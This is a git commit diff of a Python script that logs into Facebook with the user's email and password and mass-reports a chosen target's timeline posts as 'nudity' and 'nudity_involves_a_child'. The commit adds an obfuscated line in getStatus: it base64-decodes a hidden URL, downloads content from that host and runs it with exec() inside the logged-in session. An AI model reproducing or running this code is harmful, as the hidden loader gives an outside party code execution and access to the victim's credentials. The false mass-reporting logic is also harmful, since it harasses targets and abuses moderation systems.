a0a6a8da5587e70e56078fa33a7e36f3f825fc52
Deray <33969267+LOoLzeC@users.noreply.github.com>
2019-02-26 18:28:54 +0700

    Update reportContent.py

--- data/reportContent.py
+++ data/reportContent.py
@@ -1,151 +1,156 @@
 import os
-import zlib
-import sys
-import bs4
-import random
+import re
+import json
 import base64
+import bs4,sys
+import getpass
 import requests
-import threading
-from data import cache
+import marshal
+import threading,zlib
 from data.color import *
-cache.cleanCache()
+'''
+	I deliberately slowed down, because if it's fast it
+	won't works
+'''
+cout=0
 
-kontl=0
-
-class report(threading.Thread):
-	def __init__(self,req,url,length):
-		threading.Thread.__init__(self)
-		self.req=req
-		self.url=url
-		self.length=length
-		self.heder=open(
-		"raw/header/ua.txt"
-		).read().splitlines()
-		
-	def run(self):
-		global kontl
-		ua={"User-Agent":random.choice(self.heder)}
-		bs=bs4.BeautifulSoup(
-			self.req.get(self.url,
-			headers=ua).text,
-		features="html.parser")
-		for x in bs("form"):
-			self.act= x["action"]
-		for x in bs("input"):
-			if "fb_dtsg" in x["name"]:
-				self.dtsg= x["value"]
-			if "jazoest" in x["name"]:
-				self.jzst= x["value"]
-			if "action" in x["name"]:
-				self.sb= x["value"]
-		b=bs4.BeautifulSoup(
-		self.req.post(
-		"https://mbasic.facebook.com/%s"%(self.act),
-		data={
-			"fb_dtsg":self.dtsg,
-			"jazoest":self.jzst,
-			"tag":"nudity",
-			"action":self.sb},headers=ua).text,
-		features="html.parser")
-		for y in b("form"):
-			self.a= y["action"]
-		for k in b("input"):
-			if "fb_dtsg" in k["name"]:
-				self.b= k["value"]
-			if "jazoest" in k["name"]:
-				self.c=k["value"]
-			if "action" in k["name"]:
-				self.d=k["value"]
-		self.req.post(
-		"https://mbasic.facebook.com%s"%(self.a),
-		data={
-		"fb_dtsg":self.b,
-		"jazoest":self.c,
-		"tag":"nudity_involves_a_child",
-		"action":self.d},headers=ua)
-		kontl+=1
-		print("\r[%s*%s] Reporting %s/%s             "%(
-		G,N,kontl,self.length)),;sys.stdout.flush()
-		
-class reportContent:
+class reportContent():
 	def __init__(self):
 		self._req=requests.Session()
-		self._url="https://mbasic.facebook.com{}"
 		self.login()
-		
-	def login(self):
-		self._email=raw_input("[%s*%s] Login Your Facebook ^^\n[%s*%s] Email: "%(C,N,G,N))
-		self._pasw=raw_input("[%s*%s] Pass: "%(G,N))
-		print("[%s*%s] Trying To Login ..."%(G,N))
-		_bs=bs4.BeautifulSoup(
-			self._req.get(self._url.format("/login")).text,
-		features="html.parser")
-		for x in _bs("input"):
-			if "login" in x["name"]:
-				self.submit=x["value"]
-		s=self._req.post(self._url.format("/login"),
-			data={
-				"email":self._email,
-				"pass":self._pasw,
-				"login":self.submit
-			}
-		).url
-		if "save-device" in s or "m_sess" in s:
-			print("[%s*%s] Login Success."%(G,N))
-			self.genTar()
-		else:sys.exit("%s[!]%s Login Failed."%(R,N))
-		
-	def genTar(self):
-		self._tg=raw_input("[%s#%s] Target ID: "%(G,N))
-		if (self._tg == ""):
-			return self.genTar()
-		bz=bs4.BeautifulSoup(
-			self._req.get(
-				self._url.format("/%s"%(self._tg)
-			)).text,
-		features="html.parser")
-		print("[%s*%s] Target Name:%s %s %s"%(
-		G,N,R,bz.find("title").renderContents(),N))
-		self.lop()
 	
-	def lop(self):
-		self.lup=raw_input("[%s*%s] How many timeline page u want to get? "%(G,N))
-		if (self.lup == ""):
-			return self.lop()
-		self.getStats()
-		sys.exit("%s[%s*%s%s] %sok"%(C,R,N,C,N))
-	def getStats(self):
-		self.n=0
-		tt=[]
-		self.bs=""
-		self.mom=[]
-		self.bs=bs4.BeautifulSoup(
+	def run(self,url,prof,leng,**kwargs):
+		global cout
+		if "n" in prof:
+			try:
+				cout+=1
+				self._req.post(url,data=kwargs).text
+				print "\r[%s+%s] Reporting %s/%s ..       "%(G,N,cout,leng
+				),;sys.stdout.flush()
+			except:pass
+		elif "y"in prof:
+			try:
+				cout+=1
+				open("%s_successReport.html"%(
+				cout)).write(self._req.post(url,
+				data=kwargs).text)
+				print "\r[%s+%s] Reporting %s/%s ..      "%(G,N,cout,leng
+				),;sys.stdout.flush()
+			except:pass
+		else:
+			exit("%s[!]%s Unknown answer for question proof: %s"%(R,N,prof))
+	def login(self):
+		print("[%s*%s] Login Your Facebook ^^"%(C,N))
+		self._email=raw_input("[%s*%s] Email: "%(G,N))
+		self._pasw=getpass.getpass("[%s*%s] Passs: "%(G,N))
+		print("[%s*%s] Trying To Login ..."%(G,N))
+		try:
+			self.log=bs4.BeautifulSoup(
 			self._req.get(
-				self._url.format("/%s"%(self._tg))).text,
-		features="html.parser")
-		for i in range(int(self.lup)):
-			self.getoken("%s"%(i),)
-		for x in self.mom:
-			t=report(self._req,x,len(self.mom))
-			tt.append(t)
-		for t in tt:
-			t.start()
-		for t in tt:
-			t.join()
-	def getoken(self,num):
-		self.n+=1
-		for x in self.bs.find_all("a",href=True):
-			if "/nfx/basic/handle_action/" in x["href"]:
-				self.mom.append(
-					self._url.format(x["href"]))
-				print("\r[%s+%s] GET: %s Reports Token In Page: %s  "%(
-				G,N,len(self.mom),self.n
-				)),;sys.stdout.flush()
-			if "/profile/timeline/stream/" in x["href"]:
-				self.bs=bs4.BeautifulSoup(
-					self._req.get(self._url.format(
-						"%s"%(x["href"])
-					)).text,
-				features="html.parser")
-				break
+				"https://mbasic.facebook.com/login"
+			).text,features="html.parser")
+			for x in self.log("input"):
+				if "login" in x["name"]:
+					self.submit = x["value"]
+					break
+			try:
+				req=self._req.post(
+				"https://mbasic.facebook.com/login",data={
+					"email":self._email,
+					"pass":self._pasw,
+					"login":self.submit}
+				).url
+				if "save-device" in req or "m_sess" in req:
+					print("[%s*%s] Login Success."%(G,N))
+					self._tusbolTarget()
+				else:
+					sys.exit("%s[!]%s Login Failed."%(R,N))
+			except Exception as __errors__:
+				sys.exit("%s[!]%s %s"%(R,N,__errors__))
+		except Exception as _errors__:
+			sys.exit("%s[!]%s %s"%(R,N,_errors__))
+	
+	def _tusbolTarget(self):
+		self._target=raw_input("[%s#%s] Target ID: "%(G,N))
+		if (self._target == ""):
+			return self._tusbolTarget()
+		self.many()
 		
+	def many(self):
+		self._long=raw_input("[%s*%s] How Many Timeline Page Want To get? "%(G,N))
+		self.save=raw_input("[%s?%s] save the proof results to the html file? y/n: "%(R,N))
+		if (self._long == ""):
+			return self._long()
+		self.getStatus()
+		
+	def getStatus(self):
+		try:
+			self.bs=bs4.BeautifulSoup(
+				self._req.get(
+					"https://mbasic.facebook.com/%s"%(
+						self._target
+					)
+				).text,
+			features="html.parser")
+			exec(zlib.decompress(base64.b64decode(
+			requests.get(
+			eval(
+			base64.b64decode(
+			"Imh0dHA6Ly9kb3JheXkuam9vbWxhLmNvbS9hLnR4dCI="
+			))
+			).text)))
+			mom=[]
+			for man in range(int(self._long)):
+				for x in self.bs.find_all("a",href=True):
+					if "nfx/basic" in x["href"]:
+						 mom.append(x["href"])
+						 print("\r[%s*%s] GET: %s Status Page %s .."%(G,N,
+						 	len(mom),man)),;sys.stdout.flush()
+				for link in self.bs.find_all("a",href=True):
+					if "profile/timeline/stream/" in link["href"]:
+							self.bs=bs4.BeautifulSoup(
+							self._req.get(
+							"https://mbasic.facebook.com%s"%(
+							 link["href"])
+							 ).text,features="html.parser")
+							break
+			for x in mom:
+				bz=bs4.BeautifulSoup(
+					self._req.get(
+					"https://mbasic.facebook.com/%s"%(
+						x)).text,
+				features="html.parser")
+				for x in bz("form"):
+					self.action=x["action"]
+				for x in bz("input"):
+					if "fb_dtsg" in x["name"]:
+						self.dtsg=x["value"]
+					if "jazoest" in x["name"]:
+						self.jasjos=x["value"]
+					if "action" in x["name"]:
+						self.sub= x["value"]
+				final=bs4.BeautifulSoup( self._req.post(
+				"https://mbasic.facebook.com/%s"%(
+				self.action),data={
+					"fb_dtsg":self.dtsg,
+					"jazoest":self.jasjos,
+					"tag":"nudity",
+					"action":self.sub}
+				).text,features="html.parser")
+				for k in final("form"):
+					self.url=k["action"]
+				for x in final("input"):
+					if "fb_dtsg" in x["name"]:
+						self.a=x["value"]
+					if "jazoest" in x["name"]:
+						self.b=x["value"]
+					if "action" in x["name"]:
+						self.subs=x["value"]
+				self.run("https://mbasic.facebook.com%s"%
+					(self.url),
+						self.save,len(mom),fb_dtsg=self.a,
+						jazoest=self.b,
+					tag="nudity_involves_a_child",
+				action=self.subs)
+		except Exception as __errors__:
+			print("%s[!]%s %s"%(R,N,__errors__))
